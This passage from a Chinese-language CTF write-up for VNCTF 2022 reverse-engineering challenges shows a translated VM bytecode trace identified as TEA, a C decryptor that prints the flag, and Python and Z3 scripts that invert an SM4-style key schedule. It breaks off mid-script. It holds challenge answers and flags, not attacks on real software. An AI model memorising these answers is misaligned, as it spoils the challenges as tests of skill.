class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">579781142</span></span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">387</span></span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">339</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">2312395361</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">2</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">pop REG[<span class="number">1</span>]</span><br><span class="line">pop REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">306</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">340</span></span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">1700499305</span></span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">387</span></span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">339</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">612671610</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">2</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">pop REG[<span class="number">1</span>]</span><br><span class="line">pop REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">317</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">340</span></span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">3655723000</span></span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">387</span></span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">339</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">977540402</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">2</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">pop REG[<span class="number">1</span>]</span><br><span class="line">pop REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">328</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">340</span></span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">2443935368</span></span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">387</span></span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">339</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">1778148540</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">2</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">pop REG[<span class="number">1</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">8206181</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">393</span></span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">vm quit</span><br><span class="line"></span><br><span class="line">VM-&gt;REG[<span class="number">3</span>] = <span class="number">2654435769</span></span><br><span class="line">VM-&gt;REG[<span class="number">4</span>] = <span class="number">613452</span></span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">34589</span></span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] = <span class="number">108471</span></span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] = <span class="number">1230791</span></span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] = <span class="number">0</span></span><br><span class="line">VM-&gt;REG[<span class="number">17</span>] = <span class="number">16</span></span><br><span class="line">VM-&gt;REG[<span class="number">18</span>] = <span class="number">32</span></span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">352</span></span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] = <span class="number">0</span></span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] = <span class="number">32</span></span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] = <span class="number">1</span></span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] += VM-&gt;REG[<span class="number">3</span>]<span class="built_in">sum</span> += <span class="number">2654435769</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">2</span>]v1 </span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">17</span>];v1 &lt;&lt; <span class="number">4</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] += VM-&gt;REG[<span class="number">4</span>](v1 &lt;&lt; <span class="number">4</span>) + <span class="number">613452</span></span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] = VM-&gt;REG[<span class="number">0</span>]VM-&gt;REG[<span class="number">14</span>] = (v1 &lt;&lt; <span class="number">4</span>) + <span class="number">613452</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] += VM-&gt;REG[<span class="number">8</span>]v1 + <span class="built_in">sum</span></span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] = VM-&gt;REG[<span class="number">0</span>]VM-&gt;REG[<span class="number">15</span>] = (v1 + <span class="built_in">sum</span>)</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] /= VM-&gt;REG[<span class="number">18</span>]v1 &gt;&gt; <span class="number">5</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] += VM-&gt;REG[<span class="number">5</span>](v1 &gt;&gt; <span class="number">5</span>) + <span class="number">34589</span></span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] = VM-&gt;REG[<span class="number">0</span>]VM-&gt;REG[<span class="number">16</span>] = (v1 &gt;&gt; <span class="number">5</span>) + <span class="number">34589</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">14</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] ^= VM-&gt;REG[<span class="number">15</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] ^= VM-&gt;REG[<span class="number">16</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">1</span>] += VM-&gt;REG[<span class="number">0</span>]v0 += ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">613452</span>) ^ (v1 + <span class="built_in">sum</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) + <span class="number">34589</span>)</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">1</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">17</span>];v0 &lt;&lt; <span class="number">4</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] += VM-&gt;REG[<span class="number">6</span>]v0 &lt;&lt; <span class="number">4</span> + <span class="number">108471</span></span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] = VM-&gt;REG[<span class="number">0</span>]VM-&gt;REG[<span class="number">14</span>] = (v0 &lt;&lt; <span class="number">4</span> + <span class="number">108471</span>)</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">1</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] += VM-&gt;REG[<span class="number">8</span>]v0 + <span class="built_in">sum</span></span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] = VM-&gt;REG[<span class="number">0</span>]VM-&gt;REG[<span class="number">15</span>] =  (v0 + <span class="built_in">sum</span>)</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">1</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] /= VM-&gt;REG[<span class="number">18</span>]v0 &gt;&gt; <span class="number">5</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] += VM-&gt;REG[<span class="number">7</span>]（v0 &gt;&gt; <span class="number">5</span>) + <span class="number">1230791</span></span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] = VM-&gt;REG[<span class="number">0</span>]VM-&gt;REG[<span class="number">16</span>] = (v0 &gt;&gt; <span class="number">5</span>) + <span class="number">1230791</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">14</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] ^= VM-&gt;REG[<span class="number">15</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] ^= VM-&gt;REG[<span class="number">16</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">2</span>] += VM-&gt;REG[<span class="number">0</span>]v1 += ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">108471</span>) ^ (v0 + <span class="built_in">sum</span>) ^ (v0 &gt;&gt; <span class="number">5</span>) + <span class="number">1230791</span></span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] -= VM-&gt;REG[<span class="number">12</span>]</span><br><span class="line">CMP VM-&gt;REG[<span class="number">10</span>], VM-&gt;REG[<span class="number">11</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">20</span>]</span><br><span class="line">nop</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">110</span> <span class="comment"># NO</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">111</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">20</span>]</span><br><span class="line">nop</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">121</span><span class="comment"># YES</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">101</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">115</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">20</span>]</span><br><span class="line">nop</span><br><span class="line">nop</span><br></pre></td></tr></table></figure><p>一点点分析，发现是tea加密，提取出密文和key，解密即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;                         <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123; <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125; <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;                         <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123; <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125; <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> key[] = &#123;<span class="number">613452</span>, <span class="number">34589</span>, <span class="number">108471</span>, <span class="number">1230791</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">12</span>] = &#123;</span><br><span class="line">        <span class="number">3906065887</span>,</span><br><span class="line">        <span class="number">4125344020</span>,</span><br><span class="line">        <span class="number">579781142</span>,</span><br><span class="line">        <span class="number">2312395361</span>,</span><br><span class="line">        <span class="number">1700499305</span>,</span><br><span class="line">        <span class="number">612671610</span>,</span><br><span class="line">        <span class="number">3655723000</span>,</span><br><span class="line">        <span class="number">977540402</span>,</span><br><span class="line">        <span class="number">2443935368</span>,</span><br><span class="line">        <span class="number">1778148540</span>,</span><br><span class="line">        <span class="number">8206181</span>,</span><br><span class="line">        <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">decrypt</span>(&amp;v[<span class="number">2</span> * i], key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">char</span> *)v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VNCTF&#123;ecd63ae5-8945-4ac4-b5a5-34fc3ade81e7&#125;</span></span><br></pre></td></tr></table></figure><h2 id="4-时空飞行"><a href="#4-时空飞行" class="headerlink" title="4.时空飞行"></a>4.时空飞行</h2><p>IDA打开，发现流程非常的清晰，就是时间的问题。。。</p><p>先判断输入的日期</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220223165443578.png" class="" title="image-20220223165443578"><p>写脚本直接逆即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__ROL4__</span>(<span class="params">a1, num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a1 &lt;&lt; num) &amp; <span class="number">0XFFFFFFFF</span> | (a1 &gt;&gt; (<span class="number">32</span>-num)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__ROR4__</span>(<span class="params">a1, num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a1 &gt;&gt; num) &amp; <span class="number">0XFFFFFFFF</span> | (a1 &lt;&lt; (<span class="number">32</span>-num)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_401A3B</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a1 ^ __ROL4__(a1, <span class="number">13</span>) ^ __ROR4__(a1, <span class="number">9</span>)) &amp; <span class="number">0XFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CK = [<span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>, <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>, <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>, <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>,</span><br><span class="line">      <span class="number">0xA4ABB2B9</span>, <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>, <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>, <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>, <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dword_404040 = [<span class="number">0xFD07C452</span>, <span class="number">0xEC90A488</span>, <span class="number">0x68D33CD1</span>, <span class="number">0x96F64587</span>]</span><br><span class="line">FK = [<span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span>]</span><br><span class="line"></span><br><span class="line">v5 = [<span class="number">0</span>] * <span class="number">32</span> + dword_404040</span><br><span class="line"></span><br><span class="line">j = <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):  <span class="comment"># 得到前面32个数</span></span><br><span class="line">    v5[j-<span class="number">1</span>] = sub_401A3B(v5[j] ^ v5[j+<span class="number">1</span>] ^ v5[j+<span class="number">2</span>] ^ CK[j-<span class="number">1</span>]) ^ v5[j+<span class="number">3</span>]</span><br><span class="line">    j = j - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">c = v5[:<span class="number">4</span>]</span><br><span class="line">c = [c[i] ^ FK[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">data = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    data += long_to_bytes(c[i])</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment"># 0211205</span></span><br></pre></td></tr></table></figure><p>然后再往下，用Z3解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag1_%d&quot;</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># len = 24</span></span><br><span class="line">dword_404080 = [<span class="number">0x00000025</span>, <span class="number">0x00000015</span>, <span class="number">0x000000DF</span>, <span class="number">0x000000A2</span>, <span class="number">0x000000C0</span>, <span class="number">0x00000093</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000014</span>, <span class="number">0x00000046</span>, <span class="number">0x000000C5</span>, <span class="number">0x0000000F</span>,</span><br><span class="line">                <span class="number">0x0000002E</span>, <span class="number">0x0000009A</span>, <span class="number">0x000000EB</span>, <span class="number">0x00000030</span>, <span class="number">0x000000F8</span>, <span class="number">0x00000020</span>, <span class="number">0x000000E9</span>, <span class="number">0x000000CB</span>, <span class="number">0x00000088</span>, <span class="number">0x000000C6</span>, <span class="number">0x000000BE</span>, <span class="number">0x0000008D</span>, <span class="number">0x000000E3</span>]</span><br><span class="line">dword_4050C0 = [<span class="number">0x01000000</span>, <span class="number">0x02000000</span>, <span class="number">0x04000000</span>, <span class="number">0x08000000</span>,</span><br><span class="line">                <span class="number">0x10000000</span>, <span class="number">0x20000000</span>, <span class="number">0x40000000</span>, <span class="number">0x80000000</span>, <span class="number">0x1B000000</span>, <span class="number">0x36000000</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HIBYTE</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a1 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0XFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BYTE2</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a1 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0XFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BYTE1</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0XFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BYTE</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a1 &amp; <span class="number">0XFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_401FFB</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    v3 = [<span class="number">0</span>] * <span class="number">7</span></span><br><span class="line">    <span class="comment"># sub_401EFB</span></span><br><span class="line">    v3[<span class="number">0</span>] = HIBYTE(a1)</span><br><span class="line">    v3[<span class="number">1</span>] = BYTE2(a1)</span><br><span class="line">    v3[<span class="number">2</span>] = BYTE1(a1)</span><br><span class="line">    v3[<span class="number">3</span>] = BYTE(a1)</span><br><span class="line">    <span class="comment"># sub_401F67</span></span><br><span class="line">    tmp = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        tmp[i] = v3[i]</span><br><span class="line">    v4 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        